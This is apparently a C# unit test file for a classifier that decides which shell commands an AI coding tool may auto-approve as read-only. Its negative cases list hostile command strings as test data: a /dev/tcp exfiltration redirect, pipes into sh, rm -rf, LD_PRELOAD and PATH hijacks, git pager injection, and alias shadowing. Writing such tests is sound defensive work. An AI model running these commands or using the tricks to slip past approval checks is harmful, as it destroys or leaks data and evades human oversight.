using fuseraft.Infrastructure.Plugins;

namespace FuseraftCli.Tests;

/// <summary>
/// The classifier behind <c>/hitl auto</c>. The failure direction that matters is a command that
/// changes something being called read-only — so the negative cases (and the ones that look
/// read-only but aren't) carry more weight than the positive ones.
/// </summary>
public sealed class ReadOnlyShellCommandTests
{
    // -- clearly read-only -------------------------------------------------------------------------

    [Theory]
    [InlineData("ls")]
    [InlineData("ls -la src/")]
    [InlineData("pwd")]
    [InlineData("cat README.md")]
    [InlineData("head -n 20 file.txt")]
    [InlineData("tail -n 50 app.log")]
    [InlineData("wc -l src/*.cs")]
    [InlineData("stat file.txt")]
    [InlineData("du -sh .")]
    [InlineData("df -h")]
    [InlineData("which dotnet")]
    [InlineData("echo hello")]
    [InlineData("printf '%s\\n' a b")]
    [InlineData("uname -a")]
    [InlineData("whoami")]
    [InlineData("date")]
    [InlineData("date +%s")]
    [InlineData("diff a.txt b.txt")]
    [InlineData("sha256sum file.bin")]
    [InlineData("jq '.name' package.json")]
    [InlineData("cd src")]
    [InlineData("test -f x")]
    public void SimpleReadOnlyCommands_AreReadOnly(string command) =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("grep -rn TODO src/")]
    [InlineData("rg 'fn main' --type rust")]
    [InlineData("egrep -c error app.log")]
    [InlineData("find . -name '*.cs' -type f")]
    [InlineData("find src -newer x.txt -print")]
    [InlineData("sort names.txt")]
    [InlineData("sort -n -r -k2 data.txt")]
    [InlineData("uniq -c words.txt")]
    [InlineData("tree -L 2")]
    [InlineData("file image.png")]
    [InlineData("hostname")]
    [InlineData("hostname -f")]
    public void ReadOnlyCommandsWithHarmlessFlags_AreReadOnly(string command) =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("git status")]
    [InlineData("git status --short")]
    [InlineData("git diff")]
    [InlineData("git diff --staged HEAD~1")]
    [InlineData("git log --oneline -20")]
    [InlineData("git show HEAD")]
    [InlineData("git blame src/a.cs")]
    [InlineData("git branch")]
    [InlineData("git branch -a")]
    [InlineData("git branch --show-current")]
    [InlineData("git tag")]
    [InlineData("git tag -l 'v*'")]
    [InlineData("git remote -v")]
    [InlineData("git remote show origin")]
    [InlineData("git stash list")]
    [InlineData("git config --get user.email")]
    [InlineData("git config --list")]
    [InlineData("git rev-parse HEAD")]
    [InlineData("git ls-files")]
    [InlineData("git -C ../other status")]
    [InlineData("git --no-pager log -5")]
    [InlineData("git reflog")]
    [InlineData("git grep -n TODO")]
    public void ReadOnlyGit_IsReadOnly(string command) =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("git log --oneline | head -5")]
    [InlineData("git status && git diff")]
    [InlineData("ls -la; pwd; whoami")]
    [InlineData("cat a.txt | grep foo | wc -l")]
    [InlineData("find . -name '*.log' | sort | uniq -c")]
    [InlineData("echo $(pwd)")]
    [InlineData("(cd src && ls)")]
    [InlineData("ls 2>/dev/null")]
    [InlineData("ls > /dev/null")]
    [InlineData("ls &>/dev/null")]
    [InlineData("grep foo file 2>&1")]
    [InlineData("cat < input.txt")]
    [InlineData("timeout 30 grep -r x .")]
    [InlineData("nice -n 5 ls")]
    [InlineData("env grep foo bar")]
    public void ChainsWhoseEverySegmentIsReadOnly_AreReadOnly(string command) =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly(command));

    // -- must NOT be auto-approved -----------------------------------------------------------------

    [Theory]
    [InlineData("rm file.txt")]
    [InlineData("touch x")]
    [InlineData("mkdir d")]
    [InlineData("mv a b")]
    [InlineData("cp a b")]
    [InlineData("chmod +x s.sh")]
    [InlineData("dotnet build")]
    [InlineData("npm install")]
    [InlineData("make")]
    [InlineData("python script.py")]
    [InlineData("curl https://example.com")]
    [InlineData("sleep 5")]
    [InlineData("git commit -m x")]
    [InlineData("git push")]
    [InlineData("git add .")]
    [InlineData("git checkout main")]
    [InlineData("git reset --hard")]
    [InlineData("git clean -fd")]
    [InlineData("git stash")]
    [InlineData("git stash pop")]
    [InlineData("git pull")]
    [InlineData("git fetch")]
    [InlineData("git config user.name x")]
    [InlineData("git config --unset user.name")]
    [InlineData("git branch newbranch")]
    [InlineData("git branch -D old")]
    [InlineData("git branch -m a b")]
    [InlineData("git tag v1.0")]
    [InlineData("git tag -d v1.0")]
    [InlineData("git remote add o url")]
    [InlineData("git reflog expire --all")]
    [InlineData("git reflog delete HEAD@{1}")]
    [InlineData("git")]
    [InlineData("git -C dir")]
    public void CommandsThatChangeSomething_AreNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    // -- read-only-looking commands with a writing or executing flag -------------------------------

    [Theory]
    [InlineData("find . -name '*.tmp' -delete")]
    [InlineData("find . -exec rm {} \\;")]
    [InlineData("find . -execdir chmod +x {} +")]
    [InlineData("find . -ok rm {} \\;")]
    [InlineData("find . -fprint out.txt")]
    [InlineData("find . -fls out.txt")]
    [InlineData("sort -o sorted.txt names.txt")]
    [InlineData("sort -osorted.txt names.txt")]
    [InlineData("sort -nro sorted.txt names.txt")]
    [InlineData("sort --output=sorted.txt names.txt")]
    [InlineData("uniq words.txt out.txt")]
    [InlineData("tree -o out.txt")]
    [InlineData("file -C -m magic")]
    [InlineData("date -s '2020-01-01'")]
    [InlineData("date --set='2020-01-01'")]
    [InlineData("hostname newname")]
    [InlineData("rg --pre ./decode.sh pattern")]
    [InlineData("rg --hostname-bin=./x pattern")]
    [InlineData("ag --pager='rm -rf x' pattern")]
    [InlineData("git -c core.pager='sh -c evil' log")]
    [InlineData("git -ccore.pager=x log")]
    [InlineData("git --exec-path=/tmp/evil status")]
    [InlineData("git --config-env=core.pager=EVIL log")]
    [InlineData("git diff --output=patch.diff")]
    [InlineData("git log --output=log.txt")]
    [InlineData("git diff --ext-diff")]
    [InlineData("git grep -O 'sh -c evil' foo")]
    public void ReadOnlyLookingCommandsWithAWritingOrExecutingFlag_AreNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    // -- redirections and pipes into writers/executors ---------------------------------------------

    [Theory]
    [InlineData("echo hi > out.txt")]
    [InlineData("echo hi >> out.txt")]
    [InlineData("echo hi >out.txt")]
    [InlineData("cat a > b")]
    [InlineData("ls 2> err.txt")]
    [InlineData("ls 2>err.txt")]
    [InlineData("ls &> all.txt")]
    [InlineData("ls >| force.txt")]
    [InlineData("cat file > /dev/tcp/host/80")]
    [InlineData("echo x > /etc/hosts")]
    [InlineData("ls | tee out.txt")]
    [InlineData("cat a | sh")]
    [InlineData("cat a | bash")]
    [InlineData("ls | xargs rm")]
    [InlineData("ls | xargs cat")]
    [InlineData("echo hi | python")]
    [InlineData("echo hi | sed -i s/a/b/ f")]
    [InlineData("awk 'BEGIN{system(\"id\")}'")]
    [InlineData("sed -i s/a/b/ f")]
    [InlineData("sed -n p f")]
    public void OutputToAFileOrAnExecutingStage_IsNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    // -- one bad segment poisons the whole command -------------------------------------------------

    [Theory]
    [InlineData("ls; rm -rf build")]
    [InlineData("git status && git push")]
    [InlineData("cat a | grep x | tee log")]
    [InlineData("echo $(rm x)")]
    [InlineData("echo `rm x`")]
    [InlineData("(ls; touch x)")]
    [InlineData("if true; then rm x; fi")]
    [InlineData("ls\nrm x")]
    [InlineData("ls || rm x")]
    [InlineData("ls & rm x")]
    public void OneNonReadOnlySegment_MakesTheWholeCommandNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    // -- environment and PATH tricks ---------------------------------------------------------------

    [Theory]
    [InlineData("LD_PRELOAD=./evil.so ls")]
    [InlineData("GIT_EXTERNAL_DIFF='sh -c evil' git diff")]
    [InlineData("GIT_SSH_COMMAND=./evil git status")]
    [InlineData("PATH=./evil:$PATH ls")]
    [InlineData("FOO=1 ls")]
    [InlineData("env LD_PRELOAD=./evil.so ls")]
    [InlineData("env FOO=1 cat x")]
    [InlineData("PATH=./evil:$PATH; ls")]
    [InlineData("export PATH=./evil:$PATH; ls")]
    [InlineData("LD_PRELOAD=./x.so\nls")]
    public void EnvironmentAssignments_DisqualifyEvenAnOtherwiseReadOnlyCommand(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    // -- what the parser can't see, and how the command is spelled ---------------------------------

    [Theory]
    [InlineData("echo \"$(rm x)\"")]
    [InlineData("echo \"`rm x`\"")]
    [InlineData("cat \"$(ls)\"")]
    [InlineData("ls \"-$(printf '%s' l)\"")]
    public void SubstitutionHiddenInsideQuotes_IsNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("# just a comment")]
    [InlineData(null)]
    public void NothingToRun_IsNotReadOnly(string? command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("$CMD file")]
    [InlineData("\"$CMD\" file")]
    [InlineData("$'rm' x")]
    [InlineData("ls() { rm -rf x; }; ls")]
    [InlineData("alias ls='rm -rf x'; ls")]
    public void CommandNamesItCannotResolveOrThatAreShadowed_AreNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("/bin/ls -la")]
    [InlineData("/usr/bin/git status")]
    [InlineData("/usr/local/bin/rg foo")]
    [InlineData("\\ls")]
    [InlineData("'ls' -la")]
    public void SystemPathOrQuotedSpellingsOfReadOnlyCommands_AreStillReadOnly(string command) =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly(command));

    [Theory]
    [InlineData("./ls")]
    [InlineData("../bin/ls -la")]
    [InlineData("/tmp/evil/ls")]
    [InlineData("/tmp/ls")]
    [InlineData("~/bin/git status")]
    [InlineData("/usr/bin/../../tmp/evil/ls")]
    [InlineData("/usr/bin/evil/ls")]
    [InlineData("./git status")]
    [InlineData("/home/user/project/node_modules/.bin/grep foo")]
    public void ALocalExecutableThatMerelySharesAReadOnlyToolsName_IsNotReadOnly(string command) =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly(command));

    [Fact]
    public void HeredocBodyIsData_SoACatOfItIsReadOnly() =>
        Assert.True(ReadOnlyShellCommand.IsReadOnly("cat <<'EOF'\nrm -rf /\nEOF"));

    [Fact]
    public void HeredocInWriterPosition_IsStillCaughtByTheWritingCommand() =>
        Assert.False(ReadOnlyShellCommand.IsReadOnly("cat > f.txt <<'EOF'\nhello\nEOF"));
}
